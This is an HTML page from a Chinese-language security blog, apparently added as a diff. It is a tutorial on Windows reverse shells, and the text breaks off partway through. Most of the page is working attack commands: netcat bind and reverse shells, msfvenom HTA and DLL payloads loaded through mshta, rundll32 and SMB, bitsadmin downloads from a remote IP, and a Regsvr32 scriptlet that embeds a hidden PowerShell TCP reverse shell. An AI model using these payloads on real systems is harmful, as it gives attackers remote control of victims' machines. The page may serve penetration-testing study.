@@ -1,0 +1,857 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="August Rosenberg">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="反弹shell 简介正向shell  正向shell：控制端主动发起连接请求去连接被控制端，中间网络链路不存在阻碍。    反向shell  反向shell（反弹shell）：被控端主动发起连接请求去连接控制端，通常被控端由于防火墙限制、  权限不足、端口被占用等问题导致被控端不能正常接收发送过来的数据包。    反弹shell的方式nc正向这种方式的话，需要考虑对方的主机是否存在nc 123被控">
+<meta property="og:type" content="article">
+<meta property="og:title" content="windwos反弹shell">
+<meta property="og:url" content="https://tsy244.github.io/2024/02/06/%E6%B8%97%E9%80%8F/windwos%E5%8F%8D%E5%BC%B9shell/index.html">
+<meta property="og:site_name" content="AU9U5T">
+<meta property="og:description" content="反弹shell 简介正向shell  正向shell：控制端主动发起连接请求去连接被控制端，中间网络链路不存在阻碍。    反向shell  反向shell（反弹shell）：被控端主动发起连接请求去连接控制端，通常被控端由于防火墙限制、  权限不足、端口被占用等问题导致被控端不能正常接收发送过来的数据包。    反弹shell的方式nc正向这种方式的话，需要考虑对方的主机是否存在nc 123被控">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windwos%E5%8F%8D%E5%BC%B9shell/image-20240206195815095.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windwos%E5%8F%8D%E5%BC%B9shell/image-20240206200927799.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windwos%E5%8F%8D%E5%BC%B9shell/image-20240206202448832.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windwos%E5%8F%8D%E5%BC%B9shell/image-20240206205131654.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windwos%E5%8F%8D%E5%BC%B9shell/image-20240206205154705.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windwos%E5%8F%8D%E5%BC%B9shell/image-20240206210940202.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windwos%E5%8F%8D%E5%BC%B9shell/image-20240206225252744.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windwos%E5%8F%8D%E5%BC%B9shell/image-20240207093842891.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windwos%E5%8F%8D%E5%BC%B9shell/image-20240207094703089.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windwos%E5%8F%8D%E5%BC%B9shell/image-20240207102546441.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windwos%E5%8F%8D%E5%BC%B9shell/image-20240207103108325.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windwos%E5%8F%8D%E5%BC%B9shell/image-20240207104452006.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windwos%E5%8F%8D%E5%BC%B9shell/image-20240207112047416.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windwos%E5%8F%8D%E5%BC%B9shell/image-20240207135558597.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windwos%E5%8F%8D%E5%BC%B9shell/image-20240207135710179.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windwos%E5%8F%8D%E5%BC%B9shell/image-20240207135859435.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windwos%E5%8F%8D%E5%BC%B9shell/image-20240207140004307.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windwos%E5%8F%8D%E5%BC%B9shell/image-20240207140034057.png">
+<meta property="article:published_time" content="2024-02-06T11:29:46.000Z">
+<meta property="article:modified_time" content="2024-02-07T06:00:36.986Z">
+<meta property="article:author" content="August Rosenberg">
+<meta property="article:tag" content="渗透">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windwos%E5%8F%8D%E5%BC%B9shell/image-20240206195815095.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>windwos反弹shell - AU9U5T</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"tsy244.github.io","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":90,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":"G-BL1W5LRRDJ","gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>AU9U5T&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>Home</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>Archives</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>Categories</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>Tags</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>About</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="windwos反弹shell"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-author" aria-hidden="true"></i>
+        August Rosenberg
+      </span>
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-02-06 19:29" pubdate>
+          February 6, 2024 pm
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          5.7k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          48 mins
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">windwos反弹shell</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="反弹shell-简介"><a href="#反弹shell-简介" class="headerlink" title="反弹shell 简介"></a>反弹shell 简介</h1><h2 id="正向shell"><a href="#正向shell" class="headerlink" title="正向shell"></a>正向shell</h2><p>  正向shell：控制端主动发起连接请求去连接被控制端，中间网络链路不存在阻碍。  </p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windwos%E5%8F%8D%E5%BC%B9shell/image-20240206195815095.png" srcset="/img/loading.gif" lazyload alt="image-20240206195815095"></p>
+<h2 id="反向shell"><a href="#反向shell" class="headerlink" title="反向shell"></a>反向shell</h2><p>  反向shell（反弹shell）：被控端主动发起连接请求去连接控制端，通常被控端由于防火墙限制、  权限不足、端口被占用等问题导致被控端不能正常接收发送过来的数据包。  </p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windwos%E5%8F%8D%E5%BC%B9shell/image-20240206200927799.png" srcset="/img/loading.gif" lazyload alt="image-20240206200927799"></p>
+<h1 id="反弹shell的方式"><a href="#反弹shell的方式" class="headerlink" title="反弹shell的方式"></a>反弹shell的方式</h1><h2 id="nc"><a href="#nc" class="headerlink" title="nc"></a>nc</h2><h3 id="正向"><a href="#正向" class="headerlink" title="正向"></a>正向</h3><p>这种方式的话，需要考虑对方的主机是否存在nc</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vim">被控端：nc -lvvp <span class="hljs-number">6666</span> -<span class="hljs-keyword">e</span> cmd.<span class="hljs-keyword">exe</span><br>控制端：nc <span class="hljs-number">192.168</span>.<span class="hljs-number">1.106</span> <span class="hljs-number">6666</span><br>原理：被控端将cmd.<span class="hljs-keyword">exe</span>重定向到本地的<span class="hljs-number">6666</span>端口，控制端主动连接被控端的<span class="hljs-number">6666</span>端口，即可获得<span class="hljs-keyword">shell</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="反向"><a href="#反向" class="headerlink" title="反向"></a>反向</h3><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vim">控制端：nc -lvvp <span class="hljs-number">7777</span><br>被控端：nc -<span class="hljs-keyword">e</span> cmd.<span class="hljs-keyword">exe</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">1.105</span> <span class="hljs-number">7777</span><br>原理：被控端将cmd.<span class="hljs-keyword">exe</span>重定向到控制端的<span class="hljs-number">7777</span>端口，控制端只需要监听本地的<span class="hljs-number">7777</span>端口，即可获得<span class="hljs-keyword">shell</span>。<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windwos%E5%8F%8D%E5%BC%B9shell/image-20240206202448832.png" srcset="/img/loading.gif" lazyload alt="image-20240206202448832"></p>
+<p>注意使用cmd连接有问题，建议使用powershell.exe，连接的过程中需要手动确认一下，在攻击机这边输入</p>
+<h2 id="msf中hta-server模块（mshta加载hta）"><a href="#msf中hta-server模块（mshta加载hta）" class="headerlink" title="msf中hta_server模块（mshta加载hta）"></a>msf中hta_server模块（mshta加载hta）</h2><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros">search hta_server<br>use <br><span class="hljs-built_in">set</span> target 设置为64位程序<br><span class="hljs-built_in">set</span> payload windwos/x64/metepreter/reverse_tcp<br><span class="hljs-built_in">set</span> lport 20010<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windwos%E5%8F%8D%E5%BC%B9shell/image-20240206205131654.png" srcset="/img/loading.gif" lazyload alt="image-20240206205131654"></p>
+<p>使用mshta加载这个</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windwos%E5%8F%8D%E5%BC%B9shell/image-20240206205154705.png" srcset="/img/loading.gif" lazyload alt="image-20240206205154705"></p>
+<p>成功反弹，只是火绒对网络的管控比较严格</p>
+<h2 id="msf-nc-mshta"><a href="#msf-nc-mshta" class="headerlink" title="msf+nc+mshta"></a>msf+nc+mshta</h2><p>首先在payload 这边应该使用大马，也就是非分段式的</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">msfvenom -p windows/x64/shell_reverse_tcp <span class="hljs-attribute">lport</span>=8.130.123.25 <span class="hljs-attribute">lport</span>=9999 -f hta-psh &gt; 9999.hta<br></code></pre></td></tr></table></figure>
+
+<p>然后在大马的文件之下执行http.server</p>
+<p>并且使用nc 监听payload 的指定的端口</p>
+<p>然后受害机器使用mshta加载</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">mshta</span> http://<span class="hljs-number">192.168.79.138:8000</span>/<span class="hljs-number">9999</span>.hta<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windwos%E5%8F%8D%E5%BC%B9shell/image-20240206210940202.png" srcset="/img/loading.gif" lazyload alt="image-20240206210940202"></p>
+<p>这个的原理就是使用powershell加载，但是由于xp并没有powershell所以没有办法实现</p>
+<h2 id="cs-反弹shell"><a href="#cs-反弹shell" class="headerlink" title="cs 反弹shell"></a>cs 反弹shell</h2><p>不多说老朋友了 </p>
+<h2 id="dll文件"><a href="#dll文件" class="headerlink" title="dll文件"></a>dll文件</h2><p>先生成一个payload 文件格式是dll</p>
+<p>先生成一个payload用于反弹shell</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">msfvenom -p windows/x64/shell_reverse_tcp <span class="hljs-attribute">lhost</span>=192.168.79.138 <span class="hljs-attribute">lport</span>=9999 -f dll &gt; 9999.dll<br></code></pre></td></tr></table></figure>
+
+<p>然后使用handler监听</p>
+<p>使用dll文件有两种方式</p>
+<ul>
+<li><p>本地加载</p>
+ <figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs llvm">powershell.exe -<span class="hljs-keyword">c</span> <span class="hljs-string">&quot;(New-Object System.NET.WebClient).DownloadFile(&#x27;http://192.168.79.138:8000/mingy.dll&#x27;,\&quot;</span><span class="hljs-keyword">c</span>:\august.dll\<span class="hljs-string">&quot;)&quot;</span><br>rundll<span class="hljs-number">32</span> shell<span class="hljs-number">32</span>.dll<span class="hljs-punctuation">,</span>Control_RunDLL C:\august.dll<br></code></pre></td></tr></table></figure>
+
+<p>注意dll文件执行的时候必须是绝对路径</p>
+</li>
+<li><p>smb服务加载</p>
+<p>首先需要安装smbserver用于开启smb服务</p>
+<ol>
+<li><p>clone </p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">git clone https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/fortra/im</span>packet.git<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>安装依赖</p>
+<figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">pip <span class="hljs-keyword">install</span> -r requiment.txt<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>添加为系统执行</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">python</span> setup.<span class="hljs-keyword">py</span> install <br></code></pre></td></tr></table></figure>
+</li>
+<li><p>开启一个服务</p>
+<p>低版本，在win11废除</p>
+<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">smbserver<span class="hljs-selector-class">.py</span> <span class="hljs-built_in">dll</span>(服务名) <span class="hljs-number">9999</span><span class="hljs-selector-class">.dll</span>(文件名)<br></code></pre></td></tr></table></figure>
+
+<p>高版本</p>
+<figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elm"><span class="hljs-title">smbserver</span>.py dll <span class="hljs-number">9999.</span>dll -smb2sup<span class="hljs-keyword">port</span><br></code></pre></td></tr></table></figure>
+</li>
+<li><p>受害者，只用这个</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">net</span> use \\<span class="hljs-number">192.168.79.138</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windwos%E5%8F%8D%E5%BC%B9shell/image-20240206225252744.png" srcset="/img/loading.gif" lazyload alt="image-20240206225252744"></p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">rundll32</span>.exe shell32.dll,Control_RunDLL \\<span class="hljs-number">192.168.79.138</span>\dll\<span class="hljs-number">9999</span>.dll<br></code></pre></td></tr></table></figure></li>
+</ol>
+</li>
+</ul>
+<h2 id="Metasploit-SMB-Delivery"><a href="#Metasploit-SMB-Delivery" class="headerlink" title="Metasploit SMB Delivery"></a>Metasploit SMB Delivery</h2><p>  通过Metasploit的SMB Delivery模块发起Rundll32攻击  </p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">use exploit<span class="hljs-regexp">/windows/</span>smb/smb_delivery<br>msf exploit(windows<span class="hljs-regexp">/smb/</span>smb_delivery) &gt; set srvhost <span class="hljs-number">192.168</span>.<span class="hljs-number">78.117</span><br>msf exploit(windows<span class="hljs-regexp">/smb/</span>smb_delivery) &gt; exploit –j<br>rundll32.exe \\<span class="hljs-number">192.168</span>.<span class="hljs-number">78.117</span>\GylDS\test.dll,<span class="hljs-number">0</span><br></code></pre></td></tr></table></figure>
+
+<p>加载时出现了问题，</p>
+<p>利用Rundll32加载hta反弹shell</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">msfvenom</span> -p windows/x64/meterpreter/reverse_tcp lhost=<span class="hljs-number">139.155.49.43</span> lport=<span class="hljs-number">7777</span> -f hta-psh &gt; <span class="hljs-number">44</span>.hta<br><span class="hljs-attribute">bitsadmin</span> /transfer shell http://<span class="hljs-number">139.155.49.43</span>/<span class="hljs-number">44</span>.hta C:\windows\temp\<span class="hljs-number">44</span>.hta<br><span class="hljs-attribute">rundll32</span>.exe url.dll,OpenURL <span class="hljs-number">44</span>.hta<br></code></pre></td></tr></table></figure>
+
+<h2 id="Regsvr32"><a href="#Regsvr32" class="headerlink" title="Regsvr32"></a>Regsvr32</h2><blockquote>
+<p>Regsvr32.exe是一个命令行应用程序，是 Windows 系统提供的用来向系统注册控件或者卸载控  件的命令，如Windows注册表中的dll和ActiveX控件。  </p>
+<p>Regsvr32.exe安装在Windows XP和Windows后续版本的 %systemroot%\System32 文件夹中。</p>
+</blockquote>
+<p>使用语法</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">语法:Regsvr32 [/s] [/u] [/n][/i[:cmdline]] &lt;dllname&gt;<br>/u - 注销服务器<br>/i - 调用DllInstall传递一个可选的[cmdline];当它与/u一起使用时，它调用dll来卸载<br>/n - 不要调用DllRegisterServer; 此选项必须与/i一起使用<br>/s - 沉默; 不显示消息框<br></code></pre></td></tr></table></figure>
+
+<p>本地调用计算器</p>
+<blockquote>
+<p>cmd.sct</p>
+</blockquote>
+<figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml"><span class="hljs-meta">&lt;?XML version=<span class="hljs-string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">scriptlet</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">registration</span> </span></span><br><span class="hljs-tag"><span class="language-xml">    <span class="hljs-attr">progid</span>=<span class="hljs-string">&quot;PoC&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml">    <span class="hljs-attr">classid</span>=<span class="hljs-string">&quot;</span></span></span><span class="hljs-template-variable">&#123;F0001111-0000-0000-0000-0000FEEDACDC&#125;</span><span class="language-xml"><span class="hljs-tag"><span class="hljs-string">&quot;</span> &gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">language</span>=<span class="hljs-string">&quot;JScript&quot;</span>&gt;</span><span class="language-handlebars"><span class="language-xml"></span></span></span><br><span class="language-xml"><span class="language-handlebars"><span class="language-xml">                &lt;![CDATA[</span></span></span><br><span class="language-xml"><span class="language-handlebars"><span class="language-xml">                        var r = new ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;calc.exe&quot;);</span></span></span><br><span class="language-xml"><span class="language-handlebars"><span class="language-xml">                ]]&gt;</span></span></span><br><span class="language-xml"><span class="language-handlebars"><span class="language-xml"></span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">registration</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">scriptlet</span>&gt;</span></span><br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>regsvr32.exe &#x2F;n &#x2F;s &#x2F;u &#x2F;i:cmd.sct scrobj.dll（系统自带的文件）</p>
+</blockquote>
+<p>反弹shell只需要将前面执行计算器的指令换成执行反弹shell的就好了</p>
+<figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs nsis">&lt;?XML version=<span class="hljs-string">&quot;1.0&quot;</span>?&gt;<br>&lt;scriptlet&gt;<br>&lt;registration progid=<span class="hljs-string">&quot;PoC&quot;</span> classid=<span class="hljs-string">&quot;&#123;F0001111-0000-0000-0000-0000FEEDACDC&#125;&quot;</span> &gt;<br>&lt;script language=<span class="hljs-string">&quot;JScript&quot;</span>&gt;<br>    &lt;![CDATA[<br>            <span class="hljs-keyword">var</span> <span class="hljs-variable">r</span> = new ActiveXObject(<span class="hljs-string">&quot;WScript.Shell&quot;</span>).Run(<span class="hljs-string">&#x27;powershell -w Hidden -c &quot;<span class="hljs-variable">$client</span> = New-Object System.Net.Sockets.TCPClient(\&#x27;</span><span class="hljs-number">192.168</span>.<span class="hljs-number">79.138</span>\<span class="hljs-string">&#x27;,10000);<span class="hljs-variable">$stream</span> = <span class="hljs-variable">$client.GetStream</span>();[byte[]]<span class="hljs-variable">$bytes</span> = 0..65535|%&#123;0&#125;;while((<span class="hljs-variable">$i</span> = <span class="hljs-variable">$stream.Read</span>(<span class="hljs-variable">$bytes</span>, 0, <span class="hljs-variable">$bytes.Length</span>)) -ne 0)&#123;;<span class="hljs-variable">$data</span> = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(<span class="hljs-variable">$bytes</span>,0, <span class="hljs-variable">$i</span>);<span class="hljs-variable">$sendback</span> = (iex <span class="hljs-variable">$data</span> 2&gt;&amp;1 | Out-String );<span class="hljs-variable">$sendback2</span>  = <span class="hljs-variable">$sendback</span> + \&#x27;</span>PS \<span class="hljs-string">&#x27; + (pwd).Path + \&#x27;</span>&gt; \<span class="hljs-string">&#x27;;<span class="hljs-variable">$sendbyte</span> = ([text.encoding]::ASCII).GetBytes(<span class="hljs-variable">$sendback2</span>);<span class="hljs-variable">$stream.Write</span>(<span class="hljs-variable">$sendbyte</span>,0,<span class="hljs-variable">$sendbyte.Length</span>);<span class="hljs-variable">$stream.Flush</span>()&#125;;<span class="hljs-variable">$client.Close</span>()&quot;&#x27;</span>)<span class="hljs-comment">;</span><br><br>    ]]&gt;<br>&lt;/script&gt;<br>&lt;/registration&gt;<br>&lt;/scriptlet&gt;<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windwos%E5%8F%8D%E5%BC%B9shell/image-20240207093842891.png" srcset="/img/loading.gif" lazyload alt="image-20240207093842891"></p>
+<p>反弹成功</p>
+<p>远程执行加载，将srt文件放入http.server服务器里</p>
+<p>然后使用远程加载的方式执行</p>
+<p>然后受害者执行</p>
